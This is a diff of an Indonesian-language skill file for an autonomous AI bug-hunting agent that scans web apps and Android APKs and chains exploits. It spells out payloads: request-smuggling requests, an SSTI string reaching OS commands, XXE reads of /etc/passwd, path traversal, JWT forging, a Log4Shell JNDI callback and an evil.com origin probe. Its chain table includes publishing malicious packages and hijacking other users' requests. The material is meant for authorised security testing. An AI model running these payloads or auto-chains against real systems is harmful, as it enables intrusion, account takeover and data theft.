@@ -1,6 +1,6 @@
 ---
 name: bug-hunter
-description: Autonomous Bug Hunter & Vulnerability Assessor for Web & Android APK — ELITE EDITION. Covers WAF detection/bypass, subdomain brute-force, tech fingerprint, JS secret scan, JWT crack/forge, parameter fuzzing, GraphQL abuse, WebSocket probe, CVE matching, OAuth2/OIDC abuse, 2FA bypass, business logic testing, API versioning abuse, blind vulnerability detection (SQLi/SSRF/XSS via DNS canary), mobile deep link hijack, cache poisoning, subdomain takeover detection, full exploit chaining with auto severity escalation, chaos/monkey testing with verified cleanup, Playwright live watch mode with diff engine, multi-platform bug bounty templates (HackerOne/Bugcrowd/generic), and ONE consolidated Word (.docx) report with PoC, CVSS, kill chain narrative. Trigger: "hunt [url|apk]", "hunt web [url]", "hunt apk [path|pkg]", "hunt --watch [interval] [url]", "bughunt <target>".
+description: Autonomous Bug Hunter & Vulnerability Assessor for Web & Android APK — ELITE EDITION. Covers WAF detection/bypass, subdomain brute-force, tech fingerprint, JS secret scan, JWT crack/forge, parameter fuzzing, GraphQL abuse, WebSocket probe, CVE matching, OAuth2/OIDC abuse, 2FA bypass, business logic testing, API versioning abuse, blind vulnerability detection (SQLi/SSRF/XSS via DNS canary), mobile deep link hijack, cache poisoning, subdomain takeover detection, HTTP Request Smuggling (CL.TE/TE.CL), SSTI/XXE/LFI/Prototype Pollution/Clickjacking, CORS credentialed wildcard + DNS Rebinding, Dependency Confusion supply chain, full exploit chaining with auto severity escalation, chaos/monkey testing with verified cleanup, Playwright live watch mode with diff engine, multi-platform bug bounty templates (HackerOne/Bugcrowd/generic), and ONE consolidated Word (.docx) report with PoC, CVSS, kill chain narrative. Trigger: "hunt [url|apk]", "hunt web [url]", "hunt apk [path|pkg]", "hunt --watch [interval] [url]", "bughunt <target>".
 ---
 
 # AUTONOMOUS BUG HUNTER (`bug-hunter`) — ELITE EDITION
@@ -210,13 +210,114 @@ Teknik khusus untuk kerentanan yang tidak langsung terlihat dari response:
 1. Probe `/account/profile/nonexistent.css`, `/dashboard/settings.jpg` — tambah ekstensi statis ke URL privat.
 2. Jika server melayani halaman autentikasi dengan ekstensi statis → cache menyimpan halaman privat → pengguna lain bisa akses via URL yang sama.
 
-### §15 — CVE Matching dari Tech Fingerprint
+### §15 — HTTP Request Smuggling
+
+Probe CL.TE / TE.CL / HTTP/2 downgrade pada setiap endpoint yang melewati reverse proxy atau CDN.
+
+**CL.TE probe:**
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+Jika response berikutnya dari request normal mengembalikan error 400 atau respon tak terduga → CL.TE confirmed.
+
+**TE.CL probe:**
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+```
+
+**TE.TE obfuscation:** variasikan header: `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`, `Transfer-Encoding: chunked, identity`.
+
+**HTTP/2 downgrade:** jika frontend HTTP/2, backend HTTP/1.1 → inject via pseudo-header atau header smuggling.
+
+Jika confirmed → chain ke: bypass frontend auth, poison request queue, session hijacking antarpengguna, XSS via CORS bypass.
+
+### §16 — Advanced Injection — SSTI, XXE, LFI, Prototype Pollution, Clickjacking
+
+**SSTI (Server-Side Template Injection):**
+- Payload probe: `{{7*7}}` → `49` (Jinja2/Twig), `${7*7}` → `49` (FreeMarker/Thymeleaf), `<%= 7*7 %>` (ERB), `#{7*7}` (Ruby).
+- Jika terkonfirmasi → escalate ke RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.
+
+**XXE (XML External Entity):**
+- Target: endpoint upload XML, DOCX, SVG, XLSX, JSON dengan Content-Type override.
+- Payload OOB: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{canary}/xxe">]>` → verify DNS callback.
+- Payload file read: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
+
+**Path Traversal / LFI:**
+- Probe: `../../../etc/passwd`, `%2e%2e%2fetc%2fpasswd`, `..%252f..%252fetc%252fpasswd`.
+- Target: file download endpoint, image viewer, `file=`, `path=`, `doc=`, `template=` parameter.
+- Windows target: `..\..\..\windows\win.ini`.
+
+**Prototype Pollution:**
+- JSON body: `{"__proto__": {"admin": true}}`, `{"constructor": {"prototype": {"admin": true}}}`.
+- Query string: `?__proto__[admin]=true`.
+- Jika terkonfirmasi → test privilege escalation: request endpoint admin dengan token user biasa.
+
+**Clickjacking:**
+- Cek `X-Frame-Options` dan `Content-Security-Policy: frame-ancestors` header.
+- Jika absent → generate PoC iframe HTML: `<iframe src="https://target.com/settings/change-email" style="opacity:0.1">`.
+- Severity HIGH jika halaman sensitif (password change, delete account, transfer dana) bisa di-frame.
+
+### §17 — Client-Side — CORS & DNS Rebinding
+
+**CORS Credentialed Wildcard:**
+- Probe: kirim request dengan `Origin: https://evil.com` + `withCredentials: true`.
+- Jika response: `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true` → CRITICAL.
+- Bukti aktual: `fetch('https://target.com/api/me', {credentials: 'include'})` dari origin berbeda via Playwright.
+- Cek juga: `Origin: null` → jika allowed = sandbox bypass.
+
+**DNS Rebinding:**
+- Deteksi SPA yang memanggil `localhost` atau IP private via API.
+- Probe: apakah ada endpoint yang bergantung pada Host header untuk validasi SSRF protection.
+- Jika target punya API yang accessible via localhost → DNS rebinding bisa bypass same-origin → severity HIGH.
+
+### §18 — Dependency Confusion (Supply Chain)
+
+**Probe otomatis:**
+1. Scan semua file `package.json`, `requirements.txt`, `Gemfile`, `build.gradle`, `pom.xml`, `composer.json` yang ditemukan via JS file analysis atau endpoint publik.
+2. Scan JS bundle untuk nama package internal: nama yang tidak ada di registry publik atau pakai namespace perusahaan (`@company/internal-lib`).
+3. Check registry publik:
+   - npm: `https://registry.npmjs.org/{package-name}`
+   - PyPI: `https://pypi.org/pypi/{package-name}/json`
+   - RubyGems: `https://rubygems.org/api/v1/gems/{gem-name}.json`
+4. Jika nama package internal ADA di registry publik (dan bukan milik target) → Dependency Confusion CONFIRMED → severity HIGH/CRITICAL.
+5. Jika tidak ada → nama tersebut bisa di-claim → dokumentasikan sebagai temuan.
+
+### §19 — Mobile Deep Link & Intent Hijacking
+
+**Probe APK:**
+1. Parse `AndroidManifest.xml` → identifikasi semua `<intent-filter>` dengan scheme custom (`myapp://`, `intent://`).
+2. Exported activity tanpa `android:permission` → langsung accessible dari app lain.
+3. **Deep link IDOR**: deep link yang pass user ID / token di URI → `myapp://profile?user_id=123` → ubah ke ID lain.
+4. **Universal link validation**: probe apakah `/.well-known/assetlinks.json` terkonfigurasi benar → jika tidak = any app bisa intercept.
+5. **WebView injection**: jika deep link membuka WebView dengan URL dari parameter → inject `javascript:` scheme atau path traversal.
+6. **Intent redirection**: kirim intent ke exported activity dengan data URL yang redirect ke app lain.
+
+Eksekusi via ADB:
+```bash
+adb shell am start -a android.intent.action.VIEW -d "myapp://admin?user_id=1" com.target.app/.MainActivity
+```
+
+### §20 — CVE Matching dari Tech Fingerprint
 
 Lookup via NIST NVD API: `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={tech}+{version}&cvssV3Severity=HIGH`
 
 Mapping otomatis: Nginx, WordPress, jQuery, OpenSSL, Apache Struts, Log4j, Spring Boot, Rails, Laravel, Django.
 
-### §16 — Exploit Chain (Full Auto)
+### §21 — Exploit Chain (Full Auto)
 
 | Chain | Trigger | Eksekusi |
 |---|---|---|
@@ -233,19 +334,23 @@ Mapping otomatis: Nginx, WordPress, jQuery, OpenSSL, Apache Struts, Log4j, Sprin
 | Race Condition Win | Race endpoint | 10 parallel requests → verify inconsistent state |
 | Prototype Pollution | PP confirmed | Escalate `__proto__.admin=true` → test privilege |
 | Log4Shell | Log4j detected | Inject JNDI string → verify callback (canary) |
+| SSTI RCE | SSTI confirmed | Escalate template injection → OS command execution |
 | Subdomain Takeover | Dangling CNAME | Claim subdomain via target service |
 | Cache Poisoning | Unkeyed header | Poison cache → serve malicious content |
 | Business Logic | Logic flaw confirmed | Negative price / race condition → extract value |
+| Request Smuggling | CL.TE/TE.CL | Poison queue → hijack next user request |
+| Dep Confusion | Public package exists | Publish malicious package → intercept install |
+| Deep Link Hijack | Exported activity | ADB intent → access privileged screen/data |
 
-**Auto-escalate severity** jika chain berhasil: IDOR (MEDIUM) + admin access → HIGH; XSS + hijack → CRITICAL; SSRF + internal pivot → CRITICAL.
+**Auto-escalate severity** jika chain berhasil: IDOR (MEDIUM) + admin access → HIGH; XSS + hijack → CRITICAL; SSRF + internal pivot → CRITICAL; SSTI + RCE → CRITICAL.
 
-### §17 — Chaos / Monkey Testing
+### §22 — Chaos / Monkey Testing
 
 *Web:* Input fuzzing (10k+, unicode, null byte, format string, prototype pollution), HTTP method mangling, race condition 10 parallel, error disclosure, large file upload.
 
 *APK:* `adb shell monkey -p <pkg> --throttle 100 -v 1000`, intent injection, low-memory kill, permission revoke mid-session.
 
-### §18 — Cleanup (Auto)
+### §23 — Cleanup (Auto)
 
 | Jejak | Metode |
 |---|---|
@@ -257,18 +362,18 @@ Mapping otomatis: Nginx, WordPress, jQuery, OpenSSL, Apache Struts, Log4j, Sprin
 | Proxy config emulator | `adb shell settings put global http_proxy :0` |
 | Data tidak bisa dihapus | Catat untuk vendor → cleanup status = `PARTIAL` |
 
-### §19 — Verify-Cleanup
+### §24 — Verify-Cleanup
 - Status: `VERIFIED` atau `PARTIAL`.
 
-### §20 — Triage
-- Tulis semua ke `pendukung/ai/triage.json`: findings, kill chains, CVE matches, WAF status, JWT analysis, OAuth results, 2FA bypass results, subdomain takeover, cache poisoning, blind vuln, business logic.
+### §25 — Triage
+- Tulis semua ke `pendukung/ai/triage.json`: findings, kill chains, CVE matches, WAF status, JWT, OAuth, 2FA, subdomain takeover, cache poisoning, blind vuln, business logic, smuggling, SSTI/XXE/LFI, CORS, DNS rebinding, dependency confusion, deep link hijack.
 
-### §21 — Report
+### §26 — Report
 - DOCX: `build_report.py --profile bughunt`.
-- Multi-format: `submission-hackerone.md`, `submission-bugcrowd.md`, `submission-generic.md`.
+- SATU dokumen Word final terpadu — seluruh hasil recon, temuan kerentanan, kill chain, risk register, dan format submission bug bounty (HackerOne / Bugcrowd) tercakup langsung di dalam bab dan lampiran DOCX. Tidak ada file `.md` terpisah.
 - Watch dashboard: `watch-dashboard.html`.
 
-### §22 — Watch Mode (Playwright Live Dashboard)
+### §27 — Watch Mode (Playwright Live Dashboard)
 
 Aktif jika perintah menyertakan `--watch [interval_menit]`:
 1. Playwright buka browser **visible (non-headless)**.
@@ -402,427 +507,31 @@ Alias: `bughunt [target]`, `bug hunter web <url>`, `bug hunter apk <file>`.
 
 ```
 hasil-hunt-[target]-[tanggal]/
-├── Laporan-BugHunter-[Target]-[Tanggal].docx
-├── submission-hackerone.md
-├── submission-bugcrowd.md
-├── submission-generic.md
-├── watch-dashboard.html
-└── pendukung/
-    ├── ai/
-    │   ├── triage.json
-    │   ├── triage-prev.json          ← Watch diff snapshot
-    │   ├── audit-log.jsonl
-    │   └── generated-cases.md
-    ├── bukti/
-    │   ├── network/
-    │   ├── jwt/
-    │   ├── oauth/                    ← OAuth flow captures
-    │   ├── blind/                    ← Canary callback logs
-    │   └── screenshots/
-    └── reconnaissance/
-        ├── subdomains.json
-        ├── subdomain-takeover.json   ← Takeover candidates
-        ├── tech-fingerprint.json
-        ├── endpoints.json
-        ├── js-secrets.json
-        ├── cve-matches.json
-        ├── graphql-schema.json
-        ├── waf-analysis.json
-        ├── cache-poisoning.json      ← Cache probe results
-        └── api-versions.json         ← Deprecated API endpoints
-```
-
----
-
-## 6. PERINTAH LENGKAP
-
-```bash
-hunt web https://target.com/
-hunt apk com.target.app
-hunt all https://target.com/ com.target.app
-hunt --watch 30 https://target.com/
-bughunt https://target.com/
-```
-
-Generator laporan:
-```bash
-python C:\Users\Harrys\.config\opencode\skills\bug-hunter\build_report.py --root <folder_hasil>
-```
-
-### §2 — Surface Expand (Attack Surface Discovery)
-
-**Subdomain Enumeration — multi-source:**
-- `crt.sh`: `https://crt.sh/?q=%25.{domain}&output=json`
-- `dns.bufferover.run`: `https://dns.bufferover.run/dns?q=.{domain}`
-- `hackertarget.com`: `https://api.hackertarget.com/hostsearch/?q={domain}`
-- `alienvault OTX`: `https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns`
-- `urlscan.io`: `https://urlscan.io/api/v1/search/?q=domain:{domain}&size=100`
-- Jika `SHODAN_API_KEY` ada di `.env.qa`: Shodan host search.
-- Jika `SECURITYTRAILS_KEY` ada: SecurityTrails subdomain API.
-
-**Subdomain Brute-Force (wordlist built-in):**
-Probe HTTP/HTTPS ke subdomain umum bila enumeration passive kurang:
-```
-www, api, admin, app, dev, staging, test, beta, portal, dashboard,
-mail, ftp, vpn, cdn, static, assets, media, upload, download,
-auth, login, oauth, sso, internal, intranet, corp, cloud, s3,
-ws, websocket, graphql, gql, grpc, monitor, status, health
-```
-Paralel async fetch — catat yang resolve dan return 200/301/302/403.
-
-**Technology Fingerprinting (Wappalyzer-style):**
-- Server header: `nginx`, `apache`, `iis`, `caddy`, `gunicorn`, `uvicorn`.
-- Framework: `X-Powered-By`, HTML meta generator, cookie name pattern (`PHPSESSID`, `JSESSIONID`, `ASP.NET_SessionId`, `laravel_session`, `_rails`).
-- CDN: `CF-Ray` (Cloudflare), `x-amz-cf-id` (CloudFront), `x-cache` (Varnish/Fastly).
-- JS framework: detect dari `window.__NEXT_DATA__` (Next.js), `window.angular` (Angular), `window.React`, `__vue__`.
-- CMS: WordPress (`/wp-login.php`), Drupal (`/sites/default/`), Joomla (`/administrator/`).
-
-**Port Probe Ringan:**
-Probe HTTP/HTTPS ke port: `80, 443, 8080, 8443, 3000, 3001, 4000, 4443, 5000, 8000, 8888, 9000, 9090`.
-
-**Robots.txt & Sitemap**: parse dan expand endpoint list.
-
-**JS File Analysis:**
-- Unduh seluruh `.js` file yang direferensikan dari halaman utama.
-- Scan dengan regex untuk:
-  * API endpoint tersembunyi: `/api/v[0-9]/`, `fetch\(['"](.+?)['"]\)`, `axios\.get\(['"](.+?)['"]\)`
-  * Hardcoded secret: `(?:api[_-]?key|token|secret|password|passwd|pwd)\s*[:=]\s*['"][^'"]{8,}['"]`
-  * AWS key: `AKIA[0-9A-Z]{16}`
-  * Private IP: `(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)`
-  * Firebase URL: `\.firebaseio\.com`
-  * S3 bucket: `s3\.amazonaws\.com/[^'"]+`
-
-### §3 — Recon
-
-**Web:**
-- Audit header keamanan: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, COEP, COOP.
-- CORS: wildcard `*`, reflect origin tanpa validation, `null` origin accepted.
-- Cookie flags: Secure, HttpOnly, SameSite.
-- TLS: versi (TLS 1.0/1.1 = vuln), sertifikat expired/self-signed.
-- Error disclosure: stack trace di 500, versi DB di error message.
-
-**APK:**
-- Flag `debuggable`, `allowBackup`, exported components tanpa `permission` guard.
-- `usesCleartextTraffic`, `networkSecurityConfig`.
-
-Output → `pendukung/reconnaissance/` sebagai JSON terstruktur.
-
-### §4 — JWT Analysis
-
-Jalankan pada setiap JWT yang ditemukan (Authorization header, cookie, response body):
-
-1. **Decode**: split `.` → base64url decode header + payload → tampilkan claim lengkap.
-2. **Algorithm check**:
-   - `alg: none` → coba kirim token tanpa signature → jika diterima = CRITICAL.
-   - `alg: HS256` → coba brute-force secret dengan wordlist: `secret`, `password`, `123456`, `jwt_secret`, nama domain, nama app, `changeme`, `supersecret`, `private_key` (256+ kata umum).
-   - `alg: RS256` → coba confusion attack: ganti `RS256` → `HS256`, sign dengan public key sebagai HMAC secret.
-3. **Claim tampering**:
-   - Ubah `role: user` → `role: admin`.
-   - Ubah `sub` ke ID lain.
-   - Set `exp` ke masa depan jauh.
-   - Kirim token yang sudah dimodifikasi — jika diterima = HIGH/CRITICAL.
-4. **kid injection**: jika ada `kid` claim → coba SQL injection di kid (`' UNION SELECT 'secret'--`) atau path traversal (`../../dev/null`).
-5. **jku/x5u hijacking**: jika ada URL-based key → coba ganti ke endpoint milik sendiri.
-
-Semua hasil JWT analysis masuk findings dengan ID `JWT-01`, `JWT-02`, dst.
-
-### §5 — Parameter Discovery & Fuzzing
-
-**Hidden parameter discovery:**
-Probe endpoint yang ditemukan dengan parameter tambahan:
-```
-debug, test, admin, internal, dev, beta, preview, staging,
-verbose, trace, log, dump, export, format, type, action,
-callback, redirect, url, next, return, goto, target,
-id, user_id, account_id, order_id, file, path, page, limit,
-token, key, secret, api_key, auth, session, csrf
-```
-Metode: tambahkan ke query string satu per satu, amati perubahan response (panjang, status, konten).
-
-**Value fuzzing per tipe:**
-- Integer field: `-1`, `0`, `9999999`, `2147483647`, `2147483648` (overflow).
-- String field: `null`, `undefined`, `true`, `false`, `[]`, `{}`, `""`, `" "`.
-- ID field: UUID random, negative, string, array.
-- File path: `../`, `../../etc/passwd`, `%2e%2e%2f`, `..%252f`.
-
-**Mass assignment probe:**
-Tambahkan field tak terduga ke request body: `is_admin: true`, `role: admin`, `verified: true`, `price: 0`, `discount: 100`.
-
-### §6 — GraphQL Probe
-
-Deteksi GraphQL: cek `/graphql`, `/api/graphql`, `/gql`, `/query`, `/v1/graphql`.
-
-**Jika ditemukan:**
-1. **Introspection query**: `{__schema{types{name fields{name}}}}` → map seluruh schema.
-2. **Field suggestion abuse**: kirim field salah eja → server mungkin suggest nama field valid → enumerate schema tanpa introspection.
-3. **Batch query abuse**: kirim 100 query sekaligus dalam satu request → cek rate limiting.
-4. **Mutation probe**: cari mutation yang bisa ubah data tanpa autentikasi.
-5. **Deep nesting DoS**: query bersarang 10+ level → amati response time.
-6. **IDOR via GraphQL**: query object milik user lain via ID.
-7. **Injeksi di argument**: `{user(id: "1 OR 1=1"){email}}`.
-
-### §7 — WebSocket Probe
-
-Deteksi WebSocket: cek `Upgrade: websocket` header pada response, scan JS untuk `new WebSocket(`, `socket.io`, `sockjs`.
-
-**Jika ditemukan:**
-1. Connect via Playwright: `page.evaluate(() => new WebSocket('wss://target.com/ws'))`.
-2. **Auth bypass**: connect tanpa token → amati apakah server merespons atau disconnect.
-3. **Message injection**: kirim payload JSON dengan field tak terduga, SQL injection, XSS payload.
-4. **Subscription abuse**: subscribe ke channel milik user lain via ID manipulasi.
-5. **Origin check**: connect dengan `Origin: https://evil.com` → jika diterima = MEDIUM (CORS over WebSocket).
-6. **Reconnect flood**: kirim connect/disconnect cepat → amati rate limiting.
-
-### §8 — Assess (Vulnerability Assessment Lengkap)
-
-*Web:*
-- Missing/misconfigured security headers.
-- CORS misconfiguration.
-- IDOR sistematis.
-- Unauthenticated endpoint.
-- Reflected XSS non-destructive.
-- SQLi detection (error-based + time-based blind).
-- Open redirect.
-- Path traversal.
-- SSRF probe ke `169.254.169.254`, `metadata.google.internal`, `169.254.170.2` (ECS).
-- SSTI: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.
-- XXE: embed `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`.
-- Prototype pollution: `__proto__[admin]=true` di JSON body.
-- HTTP Request Smuggling: `Content-Length` + `Transfer-Encoding` desync probe.
-
-*APK:*
-- Storage privat: plaintext di shared_prefs, SQLite, external storage.
-- HTTP cleartext traffic.
-- SSL pinning check.
-- Exported component intent injection.
-- Clipboard exposure.
-- `FLAG_SECURE` pada layar sensitif.
-
-### §9 — CVE Matching dari Tech Fingerprint
-
-Setelah tech stack teridentifikasi, lakukan lookup CVE via public API:
-
-```
-https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={tech}+{version}&cvssV3Severity=HIGH
-```
-
-Contoh mapping otomatis:
-- `Nginx 1.18.0` → lookup `nginx 1.18` → list CVE dengan CVSS ≥ 7.0.
-- `WordPress 6.2` → lookup `wordpress 6.2` → known CVE.
-- `jQuery 1.x` → XSS via DOM (CVE-2019-11358).
-- `OpenSSL 1.0.x` → Heartbleed probe (`heartbleed`).
-- `Apache Struts` → lookup CVE-2017-5638 (EternalBlue-like RCE).
-- `Log4j / log4shell` → inject `${jndi:ldap://canary.burp}` ke header User-Agent, Referer, X-Api-Version.
-
-Hasil: tabel CVE per komponen dengan link NIST, CVSS skor, dan apakah target kemungkinan rentan.
-
-### §10 — Exploit Chain (Full Auto)
-
-| Chain | Trigger Otomatis | Eksekusi |
-|---|---|---|
-| Account Takeover | IDOR + weak/no auth | Enumerate ID → access victim resource → verify data |
-| Auth Bypass | Unauth endpoint | Direct access admin endpoint → extract response |
-| SQLi Extraction | SQLi confirmed | Enum columns → extract DB version, tables, sample data |
-| SSRF Internal Pivot | SSRF confirmed | Probe internal services → map internal network |
-| JWT Takeover | JWT vuln confirmed | Forge admin token → access privileged resource |
-| GraphQL Account Enum | Introspection + IDOR | List all user IDs → extract emails/data |
-| XSS Session Hijack | Reflected XSS | Inject payload → capture cookie ke logger milik sendiri |
-| Race Condition Win | Race condition endpoint | 10 parallel requests → verify inconsistent state |
-| Prototype Pollution | PP confirmed | Escalate `__proto__.admin=true` → test privilege |
-| Log4Shell | Log4j detected | Inject JNDI string → verify callback (canary domain) |
-
-Severity temuan individual **auto-escalate** jika chain berhasil:
-- IDOR (MEDIUM) + berhasil akses data admin → upgrade ke HIGH.
-- XSS (MEDIUM) + session hijack berhasil → upgrade ke HIGH/CRITICAL.
-- SSRF (HIGH) + internal network terekspos → upgrade ke CRITICAL.
-
-### §11 — Chaos / Monkey Testing
-
-*Web:*
-- Input fuzzing: 10k string, unicode surrogat `\uD800`, null byte `%00`, format string `%s%n%x`, JSON prototype pollution `{"__proto__":{"admin":true}}`.
-- HTTP method mangling: PUT/DELETE/PATCH/TRACE pada endpoint read-only.
-- Race condition: 10 parallel request via Playwright `Promise.all`.
-- Error disclosure: stack trace, SQL query, server path bocor.
-- Large file upload: 50MB, file tipe berbahaya (`.php`, `.jsp`, `.aspx`).
-
-*APK:*
-```bash
-adb shell monkey -p <package> --throttle 100 --pct-touch 40 --pct-motion 30 --pct-appswitch 15 -v 1000
-```
-- Intent injection ke seluruh exported component.
-- Low-memory kill + restart → crash/state corruption check.
-- Permission revoke mid-session.
-
-### §12 — Cleanup (Auto)
-
-| Jejak | Metode |
-|---|---|
-| Browser cookies & session | `browser_clear_cookies`, logout endpoint |
-| Local storage / IndexedDB | `localStorage.clear(); sessionStorage.clear()` via Playwright |
-| Data uji via API | Endpoint delete/rollback dengan ID yang dicatat selama exploit |
-| File temporer device | `adb shell rm -rf /sdcard/Android/data/<pkg>/files/tmp/` |
-| Log buffer device | `adb logcat -c` |
-| Proxy config emulator | `adb shell settings put global http_proxy :0` |
-| Data tidak bisa dihapus | Catat untuk vendor → cleanup status = `PARTIAL` |
-
-### §13 — Verify-Cleanup
-- Navigasi ulang ke endpoint kritis, verifikasi sesi/data uji tidak ada.
-- Status: `VERIFIED` atau `PARTIAL`.
-
-### §14 — Triage
-- Tulis semua ke `pendukung/ai/triage.json`.
-- Kill chain narrative per chain.
-- CVE match table.
-- WAF bypass status.
-- JWT analysis results.
-
-### §15 — Report
-- Bangun DOCX: `build_report.py --profile bughunt`.
-- Multi-format: DOCX + `submission-hackerone.md` + `submission-bugcrowd.md` + `submission-generic.md`.
-- Watch dashboard: `watch-dashboard.html`.
-
-### §16 — Watch Mode (Playwright Live Dashboard)
-
-Aktif jika perintah menyertakan `--watch [interval_menit]`:
-
-1. Playwright buka browser **visible (non-headless)**.
-2. Navigasi ke `watch-dashboard.html` yang di-generate lokal.
-3. Setiap N menit: jalankan ulang recon + assess (tanpa chaos ulang).
-4. **Diff engine**: bandingkan `triage.json` sesi ini vs sesi sebelumnya (`triage-prev.json`).
-   - Temuan baru → highlight kuning di dashboard + cetak di chat.
-   - Temuan hilang/resolved → ditandai strikethrough.
-   - Severity berubah → ditandai merah.
-5. Dashboard auto-refresh 10 detik.
-6. Stop: user tutup browser atau ketik `stop hunt`.
-
----
-
-## 2. CARA MEMERINTAHKAN
-
-| Perintah | Eksekusi |
-|---|---|
-| `hunt [url]` | Web hunting penuh semua fase. |
-| `hunt web [url]` | Eksplisit web. |
-| `hunt apk [path\|pkg]` | APK hunting penuh. |
-| `hunt all [url] [apk]` | Hybrid web + APK, satu triage satu DOCX. |
-| `hunt --watch 30 [url]` | Watch mode: hunt penuh → ulang tiap 30 menit → live diff dashboard. |
-
-Alias: `bughunt [target]`, `bug hunter web <url>`, `bug hunter apk <file>`.
-
----
-
-## 3. GUARDRAIL & ZERO REDACTION POLICY
-
-1. **Otorisasi**: Jalankan hanya pada target milik sendiri, staging/UAT, atau program bug bounty dengan scope tertulis.
-2. **Stop Produksi**: Eksploit yang akan mengubah data produksi permanen tanpa rollback → hentikan chain, tandai `BLOCKED`.
-3. **Zero Redaction**: Nilai aktual dari artefak tampil apa adanya. Nilai tidak ada = `(...)`. Tidak ada `[REDACTED]`.
-4. **Kredensial**: Tidak pernah diminta di chat. Tidak pernah ditulis ke log publik.
-5. **iOS/IPA**: Belum didukung. Tandai `BLOCKED`. Tambah saat ada `xcrun simctl`.
-6. **DoS dilarang**: Chaos testing dibatasi request count yang wajar; bukan flood/DDoS.
-
----
-
-## 4. FORMAT TRIAGE.JSON STANDAR
-
-```json
-{
-  "target": "https://target.com",
-  "mode": "bughunt-web",
-  "date": "2026-11-20",
-  "environment": "Bug Bounty / Staging",
-  "verdict": "CRITICAL FINDINGS — DO NOT RELEASE",
-  "ticket_ref": "HackerOne / nama program",
-  "report": {
-    "profile": "bughunt",
-    "output": "Laporan-BugHunter-target-20261120.docx",
-    "page_breaks_before": ["kill_chains", "findings", "risk", "appendix_cases"]
-  },
-  "waf": {
-    "detected": true,
-    "type": "Cloudflare",
-    "bypass_success": ["X-Forwarded-For: 127.0.0.1", "double URL encode"],
-    "bypass_failed": ["case mutation"]
-  },
-  "recon": {
-    "subdomains_found": [
-      {"host": "api.target.com", "ip": "1.2.3.4", "status": 200, "tech": "Node.js"},
-      {"host": "admin.target.com", "ip": "1.2.3.5", "status": 403, "tech": "Nginx"}
-    ],
-    "tech_stack": ["Nginx/1.18", "React", "Node.js/18"],
-    "endpoints": [
-      {"method": "GET", "url": "/api/v1/users", "auth": "None", "status": 200}
-    ],
-    "secrets_detected": [
-      {"type": "AWS Key", "location": "static/js/main.chunk.js:L1842", "value": "AKIA...", "risk": "CRITICAL"}
-    ]
-  },
-  "jwt_analysis": [
-    {
-      "id": "JWT-01",
-      "location": "Authorization header",
-      "algorithm": "HS256",
-      "claims": {"sub": "user_123", "role": "user", "exp": 9999999999},
-      "vulnerability": "Weak secret — cracked: 'secret'",
-      "severity": "CRITICAL",
-      "exploit": "Forged admin token accepted by /api/admin/users"
-    }
-  ],
-  "cve_matches": [
-    {
-      "component": "Nginx 1.18.0",
-      "cve": "CVE-2021-23017",
-      "cvss": 7.7,
-      "description": "1-byte memory overwrite in resolver",
-      "likely_vulnerable": true,
-      "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23017"
-    }
-  ],
-  "kill_chains": [],
-  "chaos": {
-    "cleanup_status": "VERIFIED",
-    "tests": [],
-    "cleanup_items": []
-  },
-  "findings": [],
-  "passed_checks": [],
-  "limitations": [],
-  "summary": {
-    "total_findings": 0,
-    "by_severity": {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0},
-    "verdict": "PENDING"
-  }
-}
-```
-
----
-
-## 5. STRUKTUR ARTEFAK
-
-```
-hasil-hunt-[target]-[tanggal]/
-├── Laporan-BugHunter-[Target]-[Tanggal].docx    ← SATU laporan DOCX final
-├── submission-hackerone.md                       ← Draft HackerOne (top 5 findings)
-├── submission-bugcrowd.md                        ← Draft Bugcrowd dengan VRT priority
-├── submission-generic.md                         ← Draft generic/private program
+├── Laporan-BugHunter-[Target]-[Tanggal].docx    ← SATU dokumen Word final terpadu
 ├── watch-dashboard.html                          ← Live dashboard (saat watch mode)
 └── pendukung/
     ├── ai/
     │   ├── triage.json                          ← Single source of truth
-    │   ├── triage-prev.json                     ← Snapshot sesi sebelumnya (watch diff)
+    │   ├── triage-prev.json                     ← Watch diff snapshot
     │   ├── audit-log.jsonl                      ← Jejak eksekusi kronologis
     │   └── generated-cases.md                   ← Daftar seluruh skenario uji
     ├── bukti/
     │   ├── network/                             ← HTTP flow capture
     │   ├── jwt/                                 ← Decoded JWT + forge attempts
+    │   ├── oauth/                               ← OAuth flow captures
+    │   ├── blind/                               ← Canary callback logs
     │   └── screenshots/                         ← Screenshot PoC tertanam di DOCX
     └── reconnaissance/
-        ├── subdomains.json                      ← Hasil subdomain enumeration + brute
+        ├── subdomains.json                      ← Subdomain enum + brute-force
+        ├── subdomain-takeover.json              ← Takeover candidates
         ├── tech-fingerprint.json                ← Server/framework/CDN detection
         ├── endpoints.json                       ← Peta endpoint teridentifikasi
         ├── js-secrets.json                      ← Secrets dari JS file analysis
         ├── cve-matches.json                     ← CVE lookup hasil
-        ├── graphql-schema.json                  ← Hasil introspection (jika ada)
-        └── waf-analysis.json                    ← WAF type + bypass results
+        ├── graphql-schema.json                  ← Introspection schema
+        ├── waf-analysis.json                    ← WAF type + bypass results
+        ├── cache-poisoning.json                 ← Cache probe results
+        └── api-versions.json                    ← Deprecated API endpoints
 ```
 
 ---
